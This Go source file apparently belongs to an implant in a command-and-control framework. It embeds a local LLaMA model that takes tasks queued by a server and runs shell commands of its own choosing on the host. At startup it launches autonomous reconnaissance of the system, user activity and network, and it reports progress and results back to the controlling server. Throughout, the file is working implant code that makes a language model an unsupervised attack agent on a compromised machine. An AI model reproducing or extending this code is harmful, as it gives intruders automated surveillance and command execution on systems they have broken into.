//go:build llama_embed || llama_external || llama_selfextract
// +build llama_embed llama_external llama_selfextract

package llama

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/r74tech/virga/internal/implant/logger"
	"github.com/r74tech/virga/internal/implant/memdb"
	"github.com/r74tech/virga/internal/shared/protocol"
)

// llamaExecutionMutex ensures only one LLaMA task executes at a time
// LLaMA C++ library does not support concurrent execution in the same process
var llamaExecutionMutex sync.Mutex

// TaskContext represents the context for a running Llama task
type TaskContext struct {
	TaskID    string
	Context   context.Context
	Cancel    context.CancelFunc
	StartTime time.Time
	WorkerID  int
}

type LlamaIntegration struct {
	engine          *LlamaEngine
	commandExecutor CommandExecutor
	memdb           *memdb.DB

	// Worker management (queue-based system)
	workers         int
	workerSemaphore chan struct{}
	stopWorker      chan struct{}

	// Task context management (taskID -> *TaskContext)
	activeTasks sync.Map

	// In-memory task queue (used when MemDB is not available)
	taskQueue      chan *memdb.ServerTask
	taskQueueMutex sync.Mutex

	// Progress update callback (for server-side progress reporting)
	progressUpdateFunc func(taskID string, currentIteration, maxIterations int)

	// Server communication (for progress reporting)
	serverURL string
	sessionID string

	// Partial result callback (for streaming intermediate results)
	partialResultCallback func(taskID, output string)

	// Final result callback (for sending final report)
	finalResultCallback func(taskID, output string)
}

// CommandExecutor defines the interface for executing system commands
type CommandExecutor interface {
	Execute(command string) (output string, exitCode int, err error)
}

func NewLlamaIntegration(config Config) (*LlamaIntegration, error) {
	engine, err := NewLlamaEngine(config)
	if err != nil {
		return nil, err
	}

	// Default to 2 workers if not specified
	workers := config.MaxWorkers
	if workers <= 0 {
		workers = 2
	}

	li := &LlamaIntegration{
		engine:          engine,
		commandExecutor: &defaultCommandExecutor{},
		workers:         workers,
		workerSemaphore: make(chan struct{}, workers),
		stopWorker:      make(chan struct{}),
		taskQueue:       make(chan *memdb.ServerTask, 100), // Buffer for 100 tasks
	}

	return li, nil
}

func (li *LlamaIntegration) Close() {
	// Stop all workers
	close(li.stopWorker)

	// Cancel all active tasks
	li.activeTasks.Range(func(key, value interface{}) bool {
		if taskCtx, ok := value.(*TaskContext); ok {
			taskCtx.Cancel()
		}
		return true
	})

	// Close the engine
	if li.engine != nil {
		li.engine.Close()
	}
}

// StartWorkers starts the background task workers
func (li *LlamaIntegration) StartWorkers() {
	log := logger.Get()

	log.Info("Starting Llama task workers", map[string]interface{}{
		"worker_count": li.workers,
	})

	for i := 0; i < li.workers; i++ {
		go li.taskWorker(i)
	}
}

// StopWorkers stops all background task workers
func (li *LlamaIntegration) StopWorkers() {
	log := logger.Get()
	log.Info("Stopping Llama task workers", nil)
	close(li.stopWorker)
}

// SetMemDB sets the memdb instance for storing command results and llama interactions
func (li *LlamaIntegration) SetMemDB(db *memdb.DB) {
	li.memdb = db
	// Also set memdb for the engine (needed by MultiContextManager)
	if li.engine != nil {
		li.engine.memdb = db
	}
}

// SetProgressUpdateFunc sets the progress update callback function
func (li *LlamaIntegration) SetProgressUpdateFunc(f func(taskID string, currentIteration, maxIterations int)) {
	li.progressUpdateFunc = f
}

// SetServerInfo sets server URL and session ID for progress reporting
func (li *LlamaIntegration) SetServerInfo(serverURL, sessionID string) {
	li.serverURL = serverURL
	li.sessionID = sessionID

	// Automatically set progress update function to report via HTTP
	li.progressUpdateFunc = func(taskID string, currentIteration, maxIterations int) {
		li.reportProgressToServer(taskID, currentIteration, maxIterations)
	}
}

// SetPartialResultCallback sets callback for streaming intermediate results
func (li *LlamaIntegration) SetPartialResultCallback(callback func(taskID, output string)) {
	li.partialResultCallback = callback
}

// SetFinalResultCallback sets callback for sending final report
func (li *LlamaIntegration) SetFinalResultCallback(callback func(taskID, output string)) {
	li.finalResultCallback = callback
}

// reportProgressToServer sends progress update to server via HTTP POST
func (li *LlamaIntegration) reportProgressToServer(taskID string, currentIteration, maxIterations int) {
	if li.serverURL == "" || li.sessionID == "" {
		return // No server configured
	}

	log := logger.Get()

	// Build progress URL
	progressURL := fmt.Sprintf("%s/api/sessions/%s/tasks/%s/progress", li.serverURL, li.sessionID, taskID)

	// Build request body
	requestBody := map[string]interface{}{
		"current_iteration": currentIteration,
		"max_iterations":    maxIterations,
	}

	jsonData, err := json.Marshal(requestBody)
	if err != nil {
		log.Error("Failed to marshal progress data", map[string]interface{}{
			"error": err.Error(),
		})
		return
	}

	// Send HTTP POST request
	client := &http.Client{
		Timeout: 5 * time.Second,
	}

	req, err := http.NewRequest("POST", progressURL, bytes.NewBuffer(jsonData))
	if err != nil {
		log.Error("Failed to create progress request", map[string]interface{}{
			"error": err.Error(),
		})
		return
	}

	req.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		log.Debug("Failed to send progress update", map[string]interface{}{
			"error": err.Error(),
		})
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		log.Debug("Progress update failed", map[string]interface{}{
			"status_code": resp.StatusCode,
		})
	}
}

// ProcessRequest handles incoming requests from the implant core
func (li *LlamaIntegration) ProcessRequest(request protocol.Request) protocol.Response {
	log := logger.Get()

	// Log the incoming request
	log.LogLlama("request_received", map[string]interface{}{
		"request_id":   request.ID,
		"request_type": request.Type,
	})

	// Route to appropriate handler based on request type
	switch request.Type {
	case "llama_task", "llama_interactive", "llama_autonomous":
		// All task types go through the queue
		return li.enqueueLlamaTask(request)
	case "llama_status":
		return li.getTaskStatus(request)
	case "llama_list_tasks":
		return li.listTasks(request)
	case "llama_cancel":
		return li.cancelTask(request)
	default:
		return protocol.Response{
			RequestID: request.ID,
			Status:    protocol.StatusError,
			Error:     "unknown llama request type",
		}
	}
}

// enqueueLlamaTask enqueues a Llama task to MemDB and returns immediately
func (li *LlamaIntegration) enqueueLlamaTask(request protocol.Request) protocol.Response {
	log := logger.Get()

	if li.memdb == nil {
		return protocol.Response{
			RequestID: request.ID,
			Status:    protocol.StatusError,
			Error:     "MemDB not initialized - task queueing not available",
		}
	}

	// Store task in MemDB with payload as JSON
	// Use request.ID as task ID to maintain consistency between CLI and worker
	payload := string(request.Data)
	task, err := li.memdb.StoreServerTaskWithID(request.ID, request.Type, payload)
	if err != nil {
		log.Error("Failed to enqueue Llama task", map[string]interface{}{
			"request_id":   request.ID,
			"request_type": request.Type,
			"error":        err.Error(),
		})
		return protocol.Response{
			RequestID: request.ID,
			Status:    protocol.StatusError,
			Error:     fmt.Sprintf("failed to enqueue task: %v", err),
		}
	}

	log.Info("Llama task enqueued", map[string]interface{}{
		"task_id":      task.ID,
		"request_type": request.Type,
		"request_id":   request.ID,
	})

	log.LogLlama("task_enqueued", map[string]interface{}{
		"task_id":      task.ID,
		"request_type": request.Type,
	})

	// Return immediately with task ID (same as request.ID)
	response := map[string]interface{}{
		"task_id": task.ID,
		"status":  "queued",
		"message": "Task has been queued for processing",
	}

	data, _ := json.Marshal(response)
	return protocol.Response{
		RequestID: request.ID,
		Status:    protocol.StatusSuccess,
		Data:      data,
	}
}

// getTaskStatus retrieves the status of a specific task
func (li *LlamaIntegration) getTaskStatus(request protocol.Request) protocol.Response {
	log := logger.Get()

	if li.memdb == nil {
		return protocol.Response{
			RequestID: request.ID,
			Status:    protocol.StatusError,
			Error:     "MemDB not initialized",
		}
	}

	var statusRequest struct {
		TaskID string `json:"task_id"`
	}

	if err := json.Unmarshal(request.Data, &statusRequest); err != nil {
		return protocol.Response{
			RequestID: request.ID,
			Status:    protocol.StatusError,
			Error:     "invalid status request: " + err.Error(),
		}
	}

	// Get task from MemDB
	task, err := li.memdb.GetTaskByID(statusRequest.TaskID)
	if err != nil {
		log.Warn("Task not found", map[string]interface{}{
			"task_id": statusRequest.TaskID,
			"error":   err.Error(),
		})
		return protocol.Response{
			RequestID: request.ID,
			Status:    protocol.StatusError,
			Error:     fmt.Sprintf("task not found: %v", err),
		}
	}

	// Build response
	response := map[string]interface{}{
		"task_id":     task.ID,
		"task_type":   task.Type,
		"status":      task.Status,
		"received_at": task.ReceivedAt,
	}

	// Add worker info if task is executing
	if task.Status == "executing" {
		if taskCtx, ok := li.activeTasks.Load(task.ID); ok {
			ctx := taskCtx.(*TaskContext)
			response["worker_id"] = ctx.WorkerID
			response["started_at"] = ctx.StartTime
		}
	}

	// Add completion info if task is done
	if task.CompletedAt != nil {
		response["completed_at"] = task.CompletedAt
		response["duration"] = task.CompletedAt.Sub(task.ReceivedAt).Seconds()
	}

	// Add result/error based on status
	if task.Status == "completed" && task.Result != "" {
		response["result"] = task.Result
	}

	if task.Status == "failed" && task.Error != "" {
		response["error"] = task.Error
	}

	data, _ := json.Marshal(response)
	return protocol.Response{
		RequestID: request.ID,
		Status:    protocol.StatusSuccess,
		Data:      data,
	}
}

// listTasks lists Llama tasks with optional filtering
func (li *LlamaIntegration) listTasks(request protocol.Request) protocol.Response {
	log := logger.Get()

	if li.memdb == nil {
		return protocol.Response{
			RequestID: request.ID,
			Status:    protocol.StatusError,
			Error:     "MemDB not initialized",
		}
	}

	var listRequest struct {
		Limit  int    `json:"limit,omitempty"`
		Status string `json:"status,omitempty"` // "pending", "executing", "completed", "failed", "all"
	}

	if err := json.Unmarshal(request.Data, &listRequest); err != nil {
		// Default values if parsing fails
		listRequest.Limit = 20
		listRequest.Status = "all"
	}

	if listRequest.Limit <= 0 {
		listRequest.Limit = 20
	}

	// Get tasks from MemDB
	var tasks []*memdb.ServerTask
	var err error

	if listRequest.Status == "" || listRequest.Status == "all" {
		// Get all Llama tasks
		tasks, err = li.memdb.GetTasksByType("llama_task", listRequest.Limit)
		if err != nil {
			log.Error("Failed to get tasks", map[string]interface{}{
				"error": err.Error(),
			})
		}
		// Also get other llama task types
		for _, taskType := range []string{"llama_interactive", "llama_autonomous"} {
			moreTasks, _ := li.memdb.GetTasksByType(taskType, listRequest.Limit)
			tasks = append(tasks, moreTasks...)
		}
	} else {
		// Get tasks by status
		tasks, err = li.memdb.GetTasksByStatus(listRequest.Status, listRequest.Limit)
		if err != nil {
			log.Error("Failed to get tasks by status", map[string]interface{}{
				"status": listRequest.Status,
				"error":  err.Error(),
			})
		}
		// Filter for Llama tasks only
		llamaTasks := make([]*memdb.ServerTask, 0)
		for _, task := range tasks {
			if strings.HasPrefix(task.Type, "llama_") {
				llamaTasks = append(llamaTasks, task)
			}
		}
		tasks = llamaTasks
	}

	// Build task list
	taskList := make([]map[string]interface{}, 0, len(tasks))
	for _, task := range tasks {
		taskInfo := map[string]interface{}{
			"task_id":     task.ID,
			"task_type":   task.Type,
			"status":      task.Status,
			"received_at": task.ReceivedAt,
		}

		if task.CompletedAt != nil {
			taskInfo["completed_at"] = task.CompletedAt
			taskInfo["duration"] = task.CompletedAt.Sub(task.ReceivedAt).Seconds()
		}

		taskList = append(taskList, taskInfo)
	}

	// Count by status
	stats := map[string]int{
		"pending":   0,
		"executing": 0,
		"completed": 0,
		"failed":    0,
	}

	for _, task := range tasks {
		if count, ok := stats[task.Status]; ok {
			stats[task.Status] = count + 1
		}
	}

	response := map[string]interface{}{
		"tasks":     taskList,
		"total":     len(taskList),
		"pending":   stats["pending"],
		"executing": stats["executing"],
		"completed": stats["completed"],
		"failed":    stats["failed"],
	}

	data, _ := json.Marshal(response)
	return protocol.Response{
		RequestID: request.ID,
		Status:    protocol.StatusSuccess,
		Data:      data,
	}
}

// cancelTask cancels a running or pending task
func (li *LlamaIntegration) cancelTask(request protocol.Request) protocol.Response {
	log := logger.Get()

	if li.memdb == nil {
		return protocol.Response{
			RequestID: request.ID,
			Status:    protocol.StatusError,
			Error:     "MemDB not initialized",
		}
	}

	var cancelRequest struct {
		TaskID string `json:"task_id"`
	}

	if err := json.Unmarshal(request.Data, &cancelRequest); err != nil {
		return protocol.Response{
			RequestID: request.ID,
			Status:    protocol.StatusError,
			Error:     "invalid cancel request: " + err.Error(),
		}
	}

	// Get task from MemDB
	task, err := li.memdb.GetTaskByID(cancelRequest.TaskID)
	if err != nil {
		return protocol.Response{
			RequestID: request.ID,
			Status:    protocol.StatusError,
			Error:     fmt.Sprintf("task not found: %v", err),
		}
	}

	// Check if task can be cancelled
	if task.Status == "completed" || task.Status == "failed" {
		return protocol.Response{
			RequestID: request.ID,
			Status:    protocol.StatusError,
			Error:     fmt.Sprintf("cannot cancel task in status: %s", task.Status),
		}
	}

	// If task is executing, cancel its context
	if task.Status == "executing" {
		if taskCtx, ok := li.activeTasks.Load(task.ID); ok {
			ctx := taskCtx.(*TaskContext)
			ctx.Cancel()
			li.activeTasks.Delete(task.ID)
			log.Info("Task context cancelled", map[string]interface{}{
				"task_id":   task.ID,
				"worker_id": ctx.WorkerID,
			})
		}
	}

	// Update task status in MemDB
	if err := li.memdb.UpdateServerTask(task.ID, "cancelled", "", "Task cancelled by user"); err != nil {
		log.Error("Failed to update task status", map[string]interface{}{
			"task_id": task.ID,
			"error":   err.Error(),
		})
		return protocol.Response{
			RequestID: request.ID,
			Status:    protocol.StatusError,
			Error:     fmt.Sprintf("failed to cancel task: %v", err),
		}
	}

	log.Info("Task cancelled", map[string]interface{}{
		"task_id": task.ID,
	})

	response := map[string]interface{}{
		"task_id": task.ID,
		"status":  "cancelled",
		"message": "Task has been cancelled",
	}

	data, _ := json.Marshal(response)
	return protocol.Response{
		RequestID: request.ID,
		Status:    protocol.StatusSuccess,
		Data:      data,
	}
}

// handleSingleTask has been removed - all tasks now go through the queue-based system.
// See enqueueLlamaTask() and taskWorker() for the new implementation.

// handleInteractiveMode has been removed - all tasks now go through the queue-based system.
// See enqueueLlamaTask() and taskWorker() for the new implementation.

// handleAutonomousMode has been removed - all tasks now go through the queue-based system.
// See enqueueLlamaTask() and taskWorker() for the new implementation.

// runAutonomousTasks (old version) has been removed - all tasks now go through the queue-based system.
// See runAutonomousTasksWithMemDB() for the new implementation.

// handleCancel has been removed - task cancellation now handled by cancelTask().
// See cancelTask() for the new implementation.

// handleStatus has been removed - status info now provided by getTaskStatus().
// See getTaskStatus() for the new implementation.

// handleListTasks has been removed - task listing now handled by listTasks().
// See listTasks() for the new implementation.

func (li *LlamaIntegration) executeSystemCommand(command string) CommandExecution {
	log := logger.Get()

	log.Debug("Llama executing system command", map[string]interface{}{
		"command": command,
	})

	output, exitCode, err := li.commandExecutor.Execute(command)

	log.LogLlamaCommand("", command, output, exitCode, err)

	cmdExec := CommandExecution{
		Command:  command,
		Output:   output,
		ExitCode: exitCode,
	}

	if err != nil {
		cmdExec.Error = err.Error()
	}

	return cmdExec
}

func (li *LlamaIntegration) sendReport(report map[string]interface{}) {
	// Send report asynchronously to avoid blocking
	go func() {
		// This would integrate with the implant's transport layer
		// For now, just log it
		data, _ := json.Marshal(report)
		if log := logger.Get(); log != nil {
			log.Info("Llama Report", map[string]interface{}{
				"report": string(data),
			})
		}

		// TODO: Send to C2 server when transport layer is available
		// Example: implant.SendTaskResult(report)
	}()
}

// RunInitialReconnaissance performs initial system analysis when the implant starts
func (li *LlamaIntegration) RunInitialReconnaissance() {
	log := logger.Get()

	tasks := []struct {
		Type        string `json:"type"`
		Description string `json:"description"`
	}{
		{
			Type:        "system_reconnaissance",
			Description: "Initial system reconnaissance and environment mapping",
		},
		{
			Type:        "user_activity",
			Description: "Current user activity and session analysis",
		},
		{
			Type:        "network_discovery",
			Description: "Network topology and connectivity analysis",
		},
	}

	log.Info("Starting initial reconnaissance", map[string]interface{}{
		"task_count": len(tasks),
		"has_memdb":  li.memdb != nil,
	})

	go func() {
		log.Info("Initial reconnaissance started", map[string]interface{}{
			"task_count": len(tasks),
		})

		// Check if MemDB is available and use appropriate function
		if li.memdb != nil {
			log.Info("Running initial reconnaissance with MemDB support")
			li.runAutonomousTasksWithMemDB(tasks, 600) // 10 minute intervals
		} else {
			log.Info("Running initial reconnaissance with in-memory queue")
			li.runAutonomousTasksInMemory(tasks)
		}
	}()
}

// RunInitialReconnaissanceWithTasks performs initial system analysis with custom tasks
func (li *LlamaIntegration) RunInitialReconnaissanceWithTasks(tasks []struct {
	Type        string `json:"type"`
	Description string `json:"description"`
},
) {
	log := logger.Get()

	log.Info("Starting initial reconnaissance tasks", map[string]interface{}{
		"task_count": len(tasks),
		"has_memdb":  li.memdb != nil,
	})

	// Add delay to ensure MemDB is initialized
	go func() {
		// Wait a bit for system initialization
		time.Sleep(5 * time.Second)

		// Log status
		log.Info(fmt.Sprintf("Llama autonomous task starting: executing %d tasks", len(tasks)))

		// Check if MemDB is available
		if li.memdb != nil {
			log.Info("Running autonomous tasks with MemDB support")
			li.runAutonomousTasksWithMemDB(tasks, 600) // 10 minute intervals
		} else {
			log.Info("Running autonomous tasks with in-memory queue")
			li.runAutonomousTasksInMemory(tasks)
		}
	}()
}

// defaultCommandExecutor implements CommandExecutor using os/exec
type defaultCommandExecutor struct{}

func (d *defaultCommandExecutor) Execute(command string) (string, int, error) {
	log := logger.Get()

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	var cmd *exec.Cmd

	switch runtime.GOOS {
	case "windows":
		cmd = exec.CommandContext(ctx, "cmd", "/c", command)
	default:
		cmd = exec.CommandContext(ctx, "sh", "-c", command)
	}

	log.Debug("Executing command", map[string]interface{}{
		"command": command,
		"os":      runtime.GOOS,
	})

	output, err := cmd.CombinedOutput()

	exitCode := 0
	if exitErr, ok := err.(*exec.ExitError); ok {
		exitCode = exitErr.ExitCode()
	} else if err != nil {
		exitCode = -1
	}

	return string(output), exitCode, err
}

// taskWorker is a background goroutine that processes queued Llama tasks
func (li *LlamaIntegration) taskWorker(workerID int) {
	log := logger.Get()
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	log.Info("Llama task worker started", map[string]interface{}{
		"worker_id": workerID,
	})

	for {
		select {
		case <-ticker.C:
			li.processPendingTasks(workerID)
		case <-li.stopWorker:
			log.Info("Llama task worker stopped", map[string]interface{}{
				"worker_id": workerID,
			})
			return
		}
	}
}

// processPendingTasks checks for pending tasks and executes them
func (li *LlamaIntegration) processPendingTasks(workerID int) {
	log := logger.Get()

	// Acquire semaphore to limit concurrent executions
	select {
	case li.workerSemaphore <- struct{}{}:
		defer func() { <-li.workerSemaphore }()
	default:
		// All workers are busy
		return
	}

	var serverTask *memdb.ServerTask
	var err error

	// Try to get task from MemDB first (if available)
	if li.memdb != nil {
		// Atomically claim the next pending Llama task
		// This prevents multiple workers from picking up the same task
		serverTask, err = li.memdb.ClaimNextPendingLlamaTask()
		if err != nil {
			log.Error("Failed to claim pending Llama task", map[string]interface{}{
				"worker_id": workerID,
				"error":     err.Error(),
			})
			return
		}

		// Update task status to "executing" if we got a task from MemDB
		if serverTask != nil {
			if err := li.memdb.UpdateServerTask(serverTask.ID, "executing", "", ""); err != nil {
				log.Error("Failed to update task status to executing", map[string]interface{}{
					"worker_id": workerID,
					"task_id":   serverTask.ID,
					"error":     err.Error(),
				})
				return
			}
		}
	}

	// If no MemDB task available, try in-memory queue (non-blocking)
	if serverTask == nil {
		select {
		case serverTask = <-li.taskQueue:
			// Got a task from in-memory queue
		default:
			// No task available from either source
			return
		}
	}

	// No pending task available from any source
	if serverTask == nil {
		return
	}

	log.Info("Worker picked up task", map[string]interface{}{
		"worker_id": workerID,
		"task_id":   serverTask.ID,
		"task_type": serverTask.Type,
	})

	// Execute the task
	li.executeQueuedTask(workerID, serverTask)
}

// executeQueuedTask executes a task retrieved from the queue
func (li *LlamaIntegration) executeQueuedTask(workerID int, serverTask *memdb.ServerTask) {
	// Acquire global mutex to prevent concurrent LLaMA execution
	// LLaMA C++ library does not support concurrent execution in the same process
	llamaExecutionMutex.Lock()
	defer llamaExecutionMutex.Unlock()

	log := logger.Get()
	log.Debug("Acquired LLaMA execution lock", map[string]interface{}{
		"worker_id": workerID,
		"task_id":   serverTask.ID,
	})

	// Parse the payload
	var taskRequest struct {
		Type          string                 `json:"type"`
		Description   string                 `json:"description"`
		Prompt        string                 `json:"prompt,omitempty"`
		Timeout       int                    `json:"timeout,omitempty"`
		Metadata      map[string]interface{} `json:"metadata,omitempty"`
		MaxIterations int                    `json:"max_iterations,omitempty"`
		Temperature   float64                `json:"temperature,omitempty"`
		Tasks         []struct {
			Type        string `json:"type"`
			Description string `json:"description"`
		} `json:"tasks,omitempty"` // For autonomous mode
		ReportInterval int `json:"report_interval,omitempty"` // For autonomous mode
	}

	// Parse payload if it exists (for in-memory queue, we may have empty payload)
	if serverTask.Payload != "" {
		if err := json.Unmarshal([]byte(serverTask.Payload), &taskRequest); err != nil {
			log.Error("Failed to parse task payload", map[string]interface{}{
				"worker_id": workerID,
				"task_id":   serverTask.ID,
				"error":     err.Error(),
			})
			if li.memdb != nil {
				li.memdb.UpdateServerTask(serverTask.ID, "failed", "", fmt.Sprintf("invalid payload: %v", err))
			}
			return
		}
	} else {
		// For tasks from in-memory queue, use task fields directly
		taskRequest.Type = serverTask.Type
		// Description is not stored in ServerTask, use Type as description
		taskRequest.Description = serverTask.Type
	}

	// Set timeout (default 30 minutes for Llama tasks)
	// TODO: Make this configurable from beacon.yaml
	timeout := 30 * time.Minute
	if taskRequest.Timeout > 0 {
		timeout = time.Duration(taskRequest.Timeout) * time.Second
	}

	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	// Store task context for cancellation
	taskCtx := &TaskContext{
		TaskID:    serverTask.ID,
		Context:   ctx,
		Cancel:    cancel,
		StartTime: time.Now(),
		WorkerID:  workerID,
	}
	li.activeTasks.Store(serverTask.ID, taskCtx)
	defer li.activeTasks.Delete(serverTask.ID)

	log.Info("Executing Llama task", map[string]interface{}{
		"worker_id": workerID,
		"task_id":   serverTask.ID,
		"task_type": serverTask.Type,
	})

	// Handle different task types
	var result *TaskResult
	var err error

	switch serverTask.Type {
	case "llama_autonomous":
		// Handle autonomous mode
		if len(taskRequest.Tasks) == 0 {
			err = fmt.Errorf("no tasks specified for autonomous mode")
		} else {
			// Execute autonomous tasks sequentially
			result, err = li.executeAutonomousTasks(ctx, serverTask.ID, taskRequest.Tasks, taskRequest.ReportInterval)
		}

	case "llama_interactive":
		// Handle interactive mode
		maxIterations := taskRequest.MaxIterations
		if maxIterations == 0 {
			maxIterations = 5
		}
		temperature := float32(taskRequest.Temperature)
		if temperature == 0 {
			temperature = 0.3
		}

		// Create task
		task := &Task{
			ID:          serverTask.ID,
			Type:        "interactive",
			Description: "Interactive Llama execution",
			Prompt:      taskRequest.Prompt,
			Metadata: map[string]interface{}{
				"max_iterations": maxIterations,
				"temperature":    temperature,
			},
		}

		// Set temperature and execute
		originalTemp := li.engine.config.Temperature
		li.engine.config.Temperature = float64(temperature)
		defer func() { li.engine.config.Temperature = originalTemp }()

		if li.memdb != nil {
			li.engine.executeCommand = li.executeSystemCommandWithMemDB
		} else {
			li.engine.executeCommand = li.executeSystemCommand
		}

		// Set iteration result callback for streaming partial results
		li.engine.iterationResultCallback = li.partialResultCallback

		// Create progress callback to update server session
		progressCallback := func(currentIteration, maxIterations int) {
			if li.progressUpdateFunc != nil {
				li.progressUpdateFunc(serverTask.ID, currentIteration, maxIterations)
			}
		}

		result, err = li.engine.ExecuteTaskWithProgress(ctx, task, progressCallback)

	default:
		// Handle regular llama_task
		task := &Task{
			ID:          serverTask.ID,
			Type:        taskRequest.Type,
			Description: taskRequest.Description,
			Prompt:      taskRequest.Prompt,
			Metadata:    taskRequest.Metadata,
		}

		// Set command executor
		if li.memdb != nil {
			li.engine.executeCommand = li.executeSystemCommandWithMemDB
		} else {
			li.engine.executeCommand = li.executeSystemCommand
		}

		// Set iteration result callback for streaming partial results
		li.engine.iterationResultCallback = li.partialResultCallback

		// Store task start in MemDB
		if li.memdb != nil {
			li.memdb.StoreLlamaTaskStart(
				serverTask.ID,
				taskRequest.Prompt,
				serverTask.Type,
				float32(li.engine.config.Temperature),
			)
		}

		// Create progress callback to update server session
		progressCallback := func(currentIteration, maxIterations int) {
			if li.progressUpdateFunc != nil {
				li.progressUpdateFunc(serverTask.ID, currentIteration, maxIterations)
			}
		}

		result, err = li.engine.ExecuteTaskWithProgress(ctx, task, progressCallback)
	}

	// Store results
	if err != nil {
		log.Error("Llama task failed", map[string]interface{}{
			"worker_id": workerID,
			"task_id":   serverTask.ID,
			"error":     err.Error(),
		})

		if li.memdb != nil {
			li.memdb.UpdateServerTask(serverTask.ID, "failed", "", err.Error())
		}

		// Send error result via callback to ensure task completion
		if li.finalResultCallback != nil {
			errorOutput := fmt.Sprintf("## Task Failed\n\n**Error**: %s\n\n**Task**: %s", err.Error(), taskRequest.Prompt)
			log.Debug("Sending error result via callback", map[string]interface{}{
				"task_id":    serverTask.ID,
				"output_len": len(errorOutput),
			})
			li.finalResultCallback(serverTask.ID, errorOutput)
		}
	} else {
		log.Info("Llama task completed", map[string]interface{}{
			"worker_id":         workerID,
			"task_id":           serverTask.ID,
			"commands_executed": len(result.Commands),
		})

		// Marshal result to JSON and update MemDB if available
		if li.memdb != nil {
			resultData, _ := json.Marshal(result)
			li.memdb.UpdateServerTask(serverTask.ID, "completed", string(resultData), "")
		}

		// Store Llama interaction
		if li.memdb != nil {
			var commands []string
			for _, cmd := range result.Commands {
				commands = append(commands, cmd.Command)
			}

			li.memdb.StoreLlamaInteraction(
				serverTask.ID,
				taskRequest.Prompt,
				result.Output,
				serverTask.Type,
				float32(li.engine.config.Temperature),
				commands,
			)
		}

		// Send final result via callback
		if li.finalResultCallback != nil {
			log.Debug("Sending final result via callback", map[string]interface{}{
				"task_id":    serverTask.ID,
				"output_len": len(result.Output),
			})
			li.finalResultCallback(serverTask.ID, result.Output)
		} else {
			log.Warn("Final result callback is nil", map[string]interface{}{
				"task_id": serverTask.ID,
			})
		}
	}
}

// executeAutonomousTasks executes multiple autonomous tasks sequentially
func (li *LlamaIntegration) executeAutonomousTasks(ctx context.Context, parentTaskID string, tasks []struct {
	Type        string `json:"type"`
	Description string `json:"description"`
}, reportInterval int) (*TaskResult, error) {
	log := logger.Get()

	if reportInterval == 0 {
		reportInterval = 300 // 5 minutes default
	}

	log.Info("Executing autonomous tasks", map[string]interface{}{
		"parent_task_id": parentTaskID,
		"task_count":     len(tasks),
	})

	allCommands := make([]CommandExecution, 0)
	allFindings := make(map[string]interface{})
	var allOutput strings.Builder

	for i, taskDef := range tasks {
		// Check if parent context is cancelled
		select {
		case <-ctx.Done():
			return nil, ctx.Err()
		default:
		}

		log.Info("Executing autonomous subtask", map[string]interface{}{
			"parent_task_id": parentTaskID,
			"subtask_index":  i + 1,
			"subtask_type":   taskDef.Type,
		})

		// Create subtask
		task := &Task{
			ID:          fmt.Sprintf("%s_sub_%d", parentTaskID, i),
			Type:        taskDef.Type,
			Description: taskDef.Description,
		}

		// Set command executor
		if li.memdb != nil {
			li.engine.executeCommand = li.executeSystemCommandWithMemDB
		} else {
			li.engine.executeCommand = li.executeSystemCommand
		}

		// Execute subtask
		result, err := li.engine.ExecuteTask(ctx, task)
		if err != nil {
			log.Error("Autonomous subtask failed", map[string]interface{}{
				"parent_task_id": parentTaskID,
				"subtask_index":  i + 1,
				"error":          err.Error(),
			})
			// Continue with next task even if one fails
			allOutput.WriteString(fmt.Sprintf("\n[Subtask %d FAILED: %v]\n", i+1, err))
			continue
		}

		// Aggregate results
		allCommands = append(allCommands, result.Commands...)
		// Merge findings maps
		if result.Findings != nil {
			for k, v := range result.Findings {
				allFindings[fmt.Sprintf("subtask_%d_%s", i+1, k)] = v
			}
		}
		allOutput.WriteString(fmt.Sprintf("\n=== Subtask %d: %s ===\n%s\n", i+1, taskDef.Type, result.Output))

		// Wait before next task (except for last task)
		if i < len(tasks)-1 {
			log.Info("Waiting before next subtask", map[string]interface{}{
				"wait_seconds": reportInterval,
			})
			time.Sleep(time.Duration(reportInterval) * time.Second)
		}
	}

	// Return aggregated result
	return &TaskResult{
		Output:   allOutput.String(),
		Commands: allCommands,
		Findings: allFindings,
	}, nil
}

// runAutonomousTasksInMemory runs autonomous tasks using in-memory queue (without MemDB)
func (li *LlamaIntegration) runAutonomousTasksInMemory(tasks []struct {
	Type        string `json:"type"`
	Description string `json:"description"`
}) {
	log := logger.Get()

	log.Info("Starting autonomous tasks with in-memory queue", map[string]interface{}{
		"task_count":    len(tasks),
		"engine_loaded": li.engine != nil,
	})

	// Check if engine is initialized
	if li.engine == nil {
		log.Error("Llama engine is not initialized, cannot run tasks")
		return
	}

	// Queue all tasks to in-memory queue
	for i, taskDef := range tasks {
		taskID := fmt.Sprintf("auto_%s_%d", taskDef.Type, time.Now().UnixNano())

		// Create a minimal task with Type and Status
		// Note: ServerTask doesn't have Description field, so we'll encode it in Payload
		taskPayload := fmt.Sprintf(`{"type":"%s","description":"%s"}`, taskDef.Type, taskDef.Description)

		serverTask := &memdb.ServerTask{
			ID:         taskID,
			Type:       taskDef.Type,
			Payload:    taskPayload,
			Status:     "pending",
			ReceivedAt: time.Now(),
		}

		log.Info("Queuing autonomous task", map[string]interface{}{
			"task_index":       i + 1,
			"total_tasks":      len(tasks),
			"task_id":          taskID,
			"task_type":        taskDef.Type,
			"task_description": taskDef.Description,
		})

		// Add task to in-memory queue (non-blocking)
		select {
		case li.taskQueue <- serverTask:
			log.Info("Task queued successfully", map[string]interface{}{
				"task_id":   taskID,
				"task_type": taskDef.Type,
			})
		default:
			log.Warn("Task queue is full, skipping task", map[string]interface{}{
				"task_id":   taskID,
				"task_type": taskDef.Type,
			})
		}

		// Small delay between queueing tasks
		time.Sleep(100 * time.Millisecond)
	}

	log.Info("All autonomous tasks queued", map[string]interface{}{
		"task_count": len(tasks),
	})
}
